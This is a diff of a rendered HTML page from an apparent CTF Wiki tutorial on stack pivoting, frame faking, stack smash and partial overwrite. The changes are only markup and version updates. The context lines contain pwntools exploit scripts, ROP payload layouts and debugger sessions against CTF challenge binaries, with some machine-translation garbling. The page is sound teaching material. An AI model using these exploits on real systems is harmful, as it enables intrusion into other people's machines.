@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4931,7 +4931,7 @@
 </ul>
 <p><code>`</code>asm
 pop rsp/esp</p>
-<div class="codehilite"><pre><span></span>Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset.
+<div class="codehilite"><pre><span></span><code>Of course, there will be some other postures. For example, gadgets in libc_csu_init, we can get the control rsp pointer by offset. The above is normal, the bottom is offset.
 
 
 `` `asm
@@ -4961,7 +4961,7 @@ gef➤  x/7i 0x000000000040061d
 0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
 
 0x400624 &amp;lt;__ libc_csu_init + 100&amp;gt;: right
-</pre></div>
+</code></pre></div>
 
 <p>In addition, there are more advanced fake frames.</p>
 <ul>
@@ -4972,7 +4972,7 @@ gef➤  x/7i 0x000000000040061d
 <h3 id="example">example<a class="headerlink" href="#example" title="Permanent link">&para;</a></h3>
 <h4 id="example-1">Example 1<a class="headerlink" href="#example-1" title="Permanent link">&para;</a></h4>
 <p>Here we take [X-CTF Quals 2016 - b0verfl0w] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-</a>% 20b0verfl0w) is introduced as an example. First, check the security of the program, as follows</p>
-<div class="codehilite"><pre><span></span>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec b0verfl0w                 
+<div class="codehilite"><pre><span></span><code>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ checksec b0verfl0w                 
 
     Arch:     i386-32-little
 
@@ -4985,10 +4985,10 @@ gef➤  x/7i 0x000000000040061d
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
 
     RWX:      Has RWX segments
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the source program is 32-bit and NX protection is not enabled. Let&#39;s look for the vulnerability of the program.</p>
-<div class="codehilite"><pre><span></span><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5015,7 +5015,7 @@ gef➤  x/7i 0x000000000040061d
   <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>As you can see, there is a stack overflow vulnerability in the source program. But the only bytes that can overflow are only 50-0x20-4=14 bytes, so it is difficult to implement some better ROPs. Here we consider stack pivoting. Since the program itself does not have stack protection turned on, we can lay out shellcode on the stack and execute it. Basic use ideas are as follows</p>
 <ul>
@@ -5023,7 +5023,7 @@ gef➤  x/7i 0x000000000040061d
 <li>Control eip to point to shellcode</li>
 </ul>
 <p>The first step is still relatively easy to read directly, but since the program itself will open ASLR protection, it is difficult to directly know the address of the shellcode. But the relative offset on the stack is fixed, so we can use the stack overflow to operate on the esp to point to the shellcode and directly control the program to jump to the esp. The following is to find the control program to jump to the gadgets at the esp.</p>
-<div class="codehilite"><pre><span></span>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ ROPgadget --binary b0verfl0w --only <span class="s1">&#39;jmp|ret&#39;</span>         
+<div class="codehilite"><pre><span></span><code>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ ROPgadget --binary b0verfl0w --only <span class="s1">&#39;jmp|ret&#39;</span>         
 
 Gadgets <span class="nv">information</span>
 
@@ -5036,11 +5036,11 @@ Gadgets <span class="nv">information</span>
 
 
 Unique gadgets found: <span class="m">3</span>
-</pre></div>
+</code></pre></div>
 
 <p>Here we find that there is a gadget that can jump directly to esp. Then we can lay out the payload as follows</p>
-<div class="codehilite"><pre><span></span>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
-</pre></div>
+<div class="codehilite"><pre><span></span><code>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
+</code></pre></div>
 
 <p>Then the last part of our payload changes how to set esp, you can know</p>
 <ul>
@@ -5058,7 +5058,7 @@ Unique gadgets found: <span class="m">3</span>
 <p><code>`</code>asm
 sub esp,0x28</p>
 <p>jmp esp</p>
-<div class="codehilite"><pre><span></span>So the last exp is as follows
+<div class="codehilite"><pre><span></span><code>So the last exp is as follows
 
 
 ```python
@@ -5087,7 +5087,7 @@ payload = shellcode_x86 + (
 sh.sendline(payload)
 
 sh.interactive()
-</pre></div>
+</code></pre></div>
 
 <h4 id="example-2-transfer-heap">Example 2 - Transfer heap<a class="headerlink" href="#example-2-transfer-heap" title="Permanent link">&para;</a></h4>
 <p>Wait.</p>
@@ -5104,40 +5104,40 @@ sh.interactive()
 <li>Control program EBP</li>
 </ul>
 <p>It ends up being the execution flow of the control program. In frame faking, the trick we use is to control both EBP and EIP, so that we control the execution flow of the program and also change the position of the stack frame. Generally its payload is as follows</p>
-<div class="codehilite"><pre><span></span>buffer padding|fake ebp|leave ret addr|
-</pre></div>
+<div class="codehilite"><pre><span></span><code>buffer padding|fake ebp|leave ret addr|
+</code></pre></div>
 
 <p>That is, we use stack overflow to construct the stack as above. Here we mainly talk about the next two parts</p>
 <ul>
 <li>The return address of the function is overwritten by us to execute the address of the leave ret, which indicates that the function will perform a leave ret again after it has successfully executed its own leave ret.</li>
 <li>where fake ebp is the base address of the stack frame we constructed. Note that this is an address. In general, we construct a fake stack frame as follows</li>
 </ul>
-<div class="codehilite"><pre><span></span>fake ebp
+<div class="codehilite"><pre><span></span><code>fake ebp
 
 |
 
 v
 ebp2|target function addr|leave ret addr|arg1|arg2
-</pre></div>
+</code></pre></div>
 
 <p>Here our fake ebp points to ebp2, which is the address where ebp2 is located. Generally speaking, this is all readable content that we can control.</p>
 <p><strong>The following assembly syntax is the intel syntax. </strong></p>
 <p>Before we introduce the basic control process, we still need to talk about the basic operation of the entry and exit points of the function.</p>
 <p>Entry point</p>
-<div class="codehilite"><pre><span></span>Push ebp # push ebp
+<div class="codehilite"><pre><span></span><code>Push ebp # push ebp
 Mov ebp, esp # assign the value of esp to ebp
-</pre></div>
+</code></pre></div>
 
 <p>Exit point</p>
-<div class="codehilite"><pre><span></span>leave
+<div class="codehilite"><pre><span></span><code>leave
 
 Ret #pop eip, pop the top element of the stack as the next execution address of the program
-</pre></div>
+</code></pre></div>
 
 <p>Where the leave command is equivalent</p>
-<div class="codehilite"><pre><span></span>Mov esp, ebp # assign the value of ebp to esp
+<div class="codehilite"><pre><span></span><code>Mov esp, ebp # assign the value of ebp to esp
 Pop ebp # pop ebp
-</pre></div>
+</code></pre></div>
 
 <p>Let&#39;s take a closer look at the basic control process.</p>
 <ol>
@@ -5173,13 +5173,13 @@ Pop ebp # pop ebp
 </li>
 </ol>
 <p>The stack structure at this time is as follows</p>
-<div class="codehilite"><pre><span></span>ebp
+<div class="codehilite"><pre><span></span><code>ebp
 
 |
 
 v
 ebp2 | leave ret addr | arg1 | arg2
-</pre></div>
+</code></pre></div>
 
 <ol>
 <li>
@@ -5193,7 +5193,7 @@ ebp2 | leave ret addr | arg1 | arg2
 <h3 id="2018-over">2018 安恒杯over<a class="headerlink" href="#2018-over" title="Permanent link">&para;</a></h3>
 <p>Take the over one of the An Heng Cup monthly competition in June 2018 as an example. The title can be found in [ctf-challenge] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow</a> Found in /fake_frame/over)</p>
 <h4 id="file-information">File Information<a class="headerlink" href="#file-information" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span>over.over: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>99beb778a74c68e4ce1477b559391e860dd0e946, stripped
+<div class="codehilite"><pre><span></span><code>over.over: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>99beb778a74c68e4ce1477b559391e860dd0e946, stripped
 
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/others_over/over.over&#39;</span>
 
@@ -5206,13 +5206,13 @@ ebp2 | leave ret addr | arg1 | arg2
     NX:       NX enabled
 
 FOOT: No FOOT
-</pre></div>
+</code></pre></div>
 
 <p>64-bit dynamically linked program, without PIE and canary protection, but opened
 NX protection</p>
 <h4 id="_2">分析程序<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
 <p>Put it in IDA for analysis
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5247,11 +5247,11 @@ NX protection</p>
   <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>The vulnerability is obvious, read can read 96 bits, but the length of buf is only 80, so it can cover rbp and ret addr but can only cover rbp and ret addr, so it can only be controlled by controlling rbp and ret addr at the same time. Up</p>
 <h4 id="leak-stack">leak stack<a class="headerlink" href="#leak-stack" title="Permanent link">&para;</a></h4>
 <p>In order to control rbp, we need to know some addresses. We can find that when the input length is 80, since read does not add &#39;\0&#39; to the end of the input, the value of rbp will be printed by puts, so that we can Know the address of all locations on the stack by a fixed offset
-<div class="codehilite"><pre><span></span><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00000000004006b9</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x00000000004006b9</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
 
 <span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
 
@@ -5350,13 +5350,13 @@ NX protection</p>
 <span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">distance</span> <span class="mh">0x7ffceaf111d0</span> <span class="mh">0x7ffceaf11160</span>
 
 <span class="mh">0x7ffceaf111d0</span><span class="o">-&gt;</span><span class="mh">0x7ffceaf11160</span> <span class="n">is</span> <span class="o">-</span><span class="mh">0x70</span> <span class="n">bytes</span> <span class="p">(</span><span class="o">-</span><span class="mh">0xe</span> <span class="n">words</span><span class="p">)</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>After leaking the stack address, we can control the program flow by controlling rbp as the address on the stack (such as 0x7ffceaf11160) and ret addr as the address of leave ret.</p>
 <p>For example, we can fill in the rop chain of the leak libc at 0x7ffceaf11160 + 0x8 and control it back to the <code>sub_400676</code> function to leak libc.
 ​    </p>
 <p>Then on the next use, you can use the rop to execute <code>system(&amp;quot;/bin/sh&amp;quot;)</code> or <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code> to get the shell. This question is because the input is long enough. , we can arrange the use chain of <code>execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)</code>, this method is more secure (<code>system(&amp;quot;/bin/sh&amp;quot;)</code> may be invalidated due to env destruction) , but because the structure of the stack changes during the process, some key offsets need to be determined by debugging.</p>
 <h4 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./over.over&quot;</span>
 
@@ -5419,7 +5419,7 @@ NX protection</p>
 
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>In general, this method is not very different from the stack pivot.</p>
 <h3 id="reference-reading">Reference reading<a class="headerlink" href="#reference-reading" title="Permanent link">&para;</a></h3>
@@ -5434,7 +5434,7 @@ NX protection</p>
 <h2 id="stack-smash">Stack smash<a class="headerlink" href="#stack-smash" title="Permanent link">&para;</a></h2>
 <h3 id="principle_2">Principle<a class="headerlink" href="#principle_2" title="Permanent link">&para;</a></h3>
 <p>After the program is added with canary protection, if the buffer we read overwrites the corresponding value, the program will report an error, and generally we will not care about the error message. The stack smash trick is to use the program that prints this information to get what we want. This is because after the program starts canary protection, if the canary is found to be modified, the program will execute the <code>__stack_chk_fail</code> function to print the string pointed to by the argv[0] pointer. Normally, this pointer points to the program name. Its code is as follows</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5455,14 +5455,14 @@ NX protection</p>
                     <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the <code>__fortify_fail</code> function.</p>
 <h3 id="32c3-ctf-readme">32C3 CTF readme<a class="headerlink" href="#32c3-ctf-readme" title="Permanent link">&para;</a></h3>
 <p>Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj.</p>
 <h4 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h4>
 <p>It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection.</p>
-<div class="codehilite"><pre><span></span>➜  stacksmashes git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec smashes
+<div class="codehilite"><pre><span></span><code>➜  stacksmashes git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec smashes
 
     Arch:     amd64-64-little
 
@@ -5475,11 +5475,11 @@ NX protection</p>
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
 
     FORTIFY:  Enabled
-</pre></div>
+</code></pre></div>
 
 <h4 id="_3">分析程序<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
 <p>Ida look</p>
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5539,18 +5539,18 @@ NX protection</p>
   <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>Obviously, the program has a stack overflow in <code>_IO_gets((__int64)&amp;amp;v4)</code>;</p>
 <p>In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop</p>
-<div class="codehilite"><pre><span></span>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
+</code></pre></div>
 
 <p>Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here.</p>
-<div class="codehilite"><pre><span></span>.data:0000000000600D20 ; char aPctfHereSTheFl[]
+<div class="codehilite"><pre><span></span><code>.data:0000000000600D20 ; char aPctfHereSTheFl[]
 
 .data:0000000000600D20 aPctfHereSTheFl db &#39;PCTF{Here&#39;,27h,&#39;s the flag on server}&#39;,0
-</pre></div>
+</code></pre></div>
 
 <p>But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read <code>byte_600D20[v1++] = v2;</code> is exactly the block memory, which will directly overwrite it, this We need to use a skill.</p>
 <ul>
@@ -5604,7 +5604,7 @@ gef➤  c</p>
 [+] Searching 'PCTF' in memory</p>
 <p>[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x</p>
 <p>0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" </p>
-<div class="codehilite"><pre><span></span>It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag.
+<div class="codehilite"><pre><span></span><code>It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag.
 
 
 #### Determining the offset
@@ -5674,7 +5674,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
 
 [# 2] 0x400717 → holds
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58.</p>
 <p>Also, according to the assembly code</p>
@@ -5690,7 +5690,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 <p>.text:0000000000400806                 call    ___printf_chk</p>
 <p>.text:000000000040080B                 mov     rdi, rsp</p>
 <p>.text:000000000040080E                 call    __IO_gets</p>
-<div class="codehilite"><pre><span></span>We can make sure that the starting address of the string we read is actually the rsp before calling `__IO_gets`, so we put the breakpoint at the call, as follows
+<div class="codehilite"><pre><span></span><code>We can make sure that the starting address of the string we read is actually the rsp before calling `__IO_gets`, so we put the breakpoint at the call, as follows
 
 
 `` `asm
@@ -5757,21 +5757,21 @@ Breakpoint 2, 0x000000000040080e in ?? ()
 gef➤  print $rsp
 
 $1 = (void *) 0x7fffffffda40
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is</p>
-<div class="codehilite"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x00007fffffffdc58</span><span class="o">-</span><span class="mh">0x7fffffffda40</span>
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x00007fffffffdc58</span><span class="o">-</span><span class="mh">0x7fffffffda40</span>
 
 <span class="mi">536</span>
 
 <span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">536</span><span class="p">)</span>
 
 <span class="s1">&#39;0x218&#39;</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="using-the-program">Using the program<a class="headerlink" href="#using-the-program" title="Permanent link">&para;</a></h4>
 <p>We construct the application as follows</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 
@@ -5805,7 +5805,7 @@ $1 = (void *) 0x7fffffffda40
 <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>Here we get the flag directly, there is no online saying that the flag is not available.</p>
 <h3 id="title_1">Title<a class="headerlink" href="#title_1" title="Permanent link">&para;</a></h3>
@@ -5818,7 +5818,7 @@ $1 = (void *) 0x7fffffffda40
 <h3 id="2018-babypie">2018-安恒杯-babypie<a class="headerlink" href="#2018-babypie" title="Permanent link">&para;</a></h3>
 <p>Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/">https://github.com/ctf-wiki/ctf-challenges/tree/</a> Master/pwn/stackoverflow/partial_overwrite)</p>
 <h4 id="determining-protection_1">Determining protection<a class="headerlink" href="#determining-protection_1" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span>babypie: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
+<div class="codehilite"><pre><span></span><code>babypie: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
 
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie&#39;</span>
 
@@ -5831,12 +5831,12 @@ $1 = (void *) 0x7fffffffda40
     NX:       NX enabled
 
     PIE:      PIE enabled
-</pre></div>
+</code></pre></div>
 
 <p>64-bit dynamically linked file with PIE protection and stack overflow protection enabled</p>
 <h4 id="_4">分析程序<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
 <p>Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_960</span> <span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">sub_960</span> <span class="p">()</span>
 <span class="p">{</span>
 
   <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h]</span>
@@ -5864,7 +5864,7 @@ $1 = (void *) 0x7fffffffda40
   <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>Also found that the program gives a function that can directly get the shell
 <code>`</code>asm
 .text:0000000000000A3E getshell        proc near</p>
@@ -5877,7 +5877,7 @@ $1 = (void *) 0x7fffffffda40
 <p>.text: 0000000000000A50 retn
 .text:0000000000000A50 ; } // starts at A3E</p>
 <p>.text:0000000000000A50 getshell        endp</p>
-<div class="codehilite"><pre><span></span>So we just have to control rip to this function.
+<div class="codehilite"><pre><span></span><code>So we just have to control rip to this function.
 
 
 #### leak canary
@@ -5976,7 +5976,7 @@ $1 = 0
 canary : 0xb3012605fc402a00
 
 pwndbg&amp;gt;
-</pre></div>
+</code></pre></div>
 
 <p>Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after &#39;a&#39; * (0x30 - 0x8 + 1) are received, plus the lowest bit &#39; 0&#39;, we will recover the canary of the program.</p>
 <h4 id="override-return-address">Override return address<a class="headerlink" href="#override-return-address" title="Permanent link">&para;</a></h4>
@@ -6031,7 +6031,7 @@ pwndbg&amp;gt;
    0x55dc43694a51:  push   rbp</p>
 <p>0x55dc43694a52:  mov    rbp,rsp</p>
 <p>0x55dc43694a55:  sub    rsp,0x10</p>
-<div class="codehilite"><pre><span></span>It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell.
+<div class="codehilite"><pre><span></span><code>It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell.
 
 
 The final script is as follows:
@@ -6078,12 +6078,12 @@ io.interactive ()
 
 io.close ()
 print e
-</pre></div>
+</code></pre></div>
 
 <p>It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap.</p>
 <h3 id="2018-xnuca-gets">2018-XNUCA-gets<a class="headerlink" href="#2018-xnuca-gets" title="Permanent link">&para;</a></h3>
 <p>This topic is also very interesting, as follows</p>
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -6094,12 +6094,12 @@ print e
   <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. .</p>
 <h4 id="determining-protection_2">Determining protection<a class="headerlink" href="#determining-protection_2" title="Permanent link">&para;</a></h4>
 <p>First take a look at the protection of the program</p>
-<div class="codehilite"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="mi">2018</span><span class="o">/</span><span class="mi">1124</span><span class="n">XNUCA</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">gets</span><span class="o">/</span><span class="n">gets</span><span class="err">&#39;</span>
